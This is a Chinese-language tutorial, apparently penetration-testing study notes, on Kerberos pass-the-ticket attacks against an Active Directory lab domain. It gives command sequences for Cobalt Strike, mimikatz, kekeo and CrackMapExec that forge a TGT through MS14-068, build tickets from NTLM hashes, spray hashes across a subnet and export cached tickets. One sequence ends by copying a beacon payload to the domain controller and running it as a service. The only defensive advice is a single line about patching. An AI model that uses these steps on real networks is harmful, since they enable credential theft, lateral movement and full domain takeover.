PTT (Pass-the-Ticket): 传递票据，在域环境中，攻击者使用窃取的Kerberos票据进行身份验证。

哈希传递一般需要具备管理员权限，票据传递不需要具备管理员权限
在Kerberos认证中，用户通过认证后会获得一个票据授权票据（TGT），随后可以使用TGT来获取针对特定服务的服务票据（ST）。PTT攻击涉及攻击者获取这些票据，并使用它们来访问网络资源，而无需知晓账户的明文密码。
PTT攻击的常见形式包括：
1. **黄金票据（Golden Ticket）**：攻击者使用域的`krbtgt`账户的密码哈希来伪造TGT，这允许他们以任何用户身份获取ST并访问任何服务4。
2. **白银票据（Silver Ticket）**：攻击者伪造ST，通常需要目标服务账户的密码哈希，这允许他们访问特定的服务4。
3. **MS14-068**：这是一个利用Kerberos服务漏洞的攻击，允许攻击者创建假冒的TGT，该漏洞后来被微软的补丁KB3011780修复。

PTT攻击的关键在于攻击者能够获取或伪造Kerberos票据，而不需要实际的账户密码。这种攻击可以非常危险，因为它允许攻击者在不触发典型警报的情况下，获取对敏感网络资源的访问权限。



## **利用漏洞ms14068伪造票据**
利用漏洞ms14068伪造用户身份TGT票据。等同于web中cookie伪造，直接登录后台。
MS14-068是密钥分发中心（KDC）服务中的windows漏洞。
它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。
该漏洞位于kdcsvc.dll域控制器的密钥分发中心（KDC）中。
用户可以通过呈现具有改变的PAC的KerberosTGT来获得票证。

普通域内用户，如webadmin
伪造域内用户和域控的会话，实现无需域控账号密码，连接域控，上线域控。
CS中跳板机命令：
```
测试直接创建IPC隧道，此时是需要输入账号密码的，利用漏洞，无需输入账号密码。
shell net use \\OWA2010CN-GOD\C$

获取用户的SID值，如S-1-5-21-1218902331-2157346161-1782232778-1132
shell whoami/user

权限低 如webadmin，就将ms14-068.exe上传跳板机。权限高可以尝试代理转发socks到本地运行。
准备当前用户的用户名，SID，密码，域控主机IP。
伪造生成当前的票据文件TGT_webadmin@god.org.ccache，有效期10小时。
shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 
-d 192.168.3.21 -p admin!@#45

伪造的票据文件放入跳板机的桌面目录

查看当前已有票据会话
shell klist
清除当前所有票据连接
shell klist purge

将桌面目录的伪造票据导入内存
mimikatz kerberos::ptc TGT_webadmin@god.org.ccache

查看当前已有票据会话，此时有了webadmin和krbtgt/GOD.ORG域控主机的会话
shell klist

用新身份进行IPC连接域控（无需输入域控密码了） 并新上线
shell dir \\OWA2010CN-GOD\C$
shell net use \\OWA2010CN-GOD\C$
copy beacon.exe \\OWA2010CN-GOD\C$

sc \\OWA2010CN-GOD create bindshell binpath="c:\beacon.exe"
sc \\OWA2010CN-GOD start bindshell
```
防御：域控主机打补丁MS14-068


## **利用NTLM哈希生成票据**
hash可以PTH攻击，但利用需要这些smb wmi 协议是正常，不正常就可以利用票据。
利用票据需要高权限，需找到域控主机账号的NTLM哈希。
因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，
我们可以利用hash导出这些票据，然后再导入票据，利用。
该方法类似于cookie欺骗。
缺点：票据是有有效期的有效期10小时，所以如果当前主机在连接过域控的话，有效期内可利用。

CS中跳板机命令
```
kekeo.exe上传跳板机
找到域控的hash和账号 生成新的票据导出
shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7" "exit"

清除当前所有票据连接
shell klist purge

导入票据
shell kekeo "kerberos::ptt TGT_Administrator@GOD.oRG_krbtgt~god.org@GOD.ORG.kirbi" "exit" 
ntlmhashpth攻击pthsmbwmips利用需要这些smbwmi协议是正常不正常就可以利用票据

查看票据会话
shell klist

shell dir \\owa2010cn-god\c$
```

**CME进行HASH喷洒**
21到32的ip批量比对hash值对应的主机账号，是否域控账号，再手工用hash导出生成票据。
```
proxychains python cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c #域用户HASH登录
proxychains python cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth #本地用户HASH登录
```

## **利用mimikatz导出历史票据**
需高权限，有域控管理员账号密码登陆认证过这台跳板机中有票据Ticket，且在有效期，一般10小时。

CS中跳板机命令
```
导出所有历史连接过的票据(无法清空)
mimikatz sekurlsa::tickets /export

导入票据
mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;22d3a]-2-1-40e00000-Administrator@krbtgt-god.org.kirbi

查看票据会话有没有
shell klist

有会话则连接
shell dir \\owa2010cn-god\c$
```